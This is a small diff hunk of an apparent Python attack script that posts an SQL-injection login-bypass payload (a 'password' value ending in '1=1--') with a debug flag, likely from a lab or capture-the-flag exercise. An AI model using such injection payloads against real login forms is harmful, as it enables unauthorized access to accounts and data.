@@ -3,7 +3,7 @@ import requests
 s = requests.Session()
 
 exploit = {
-    'password' : """c' be 1=1--""",
+    'password' : """' be 1=1--""",
     'debug' : '1'
 }
 
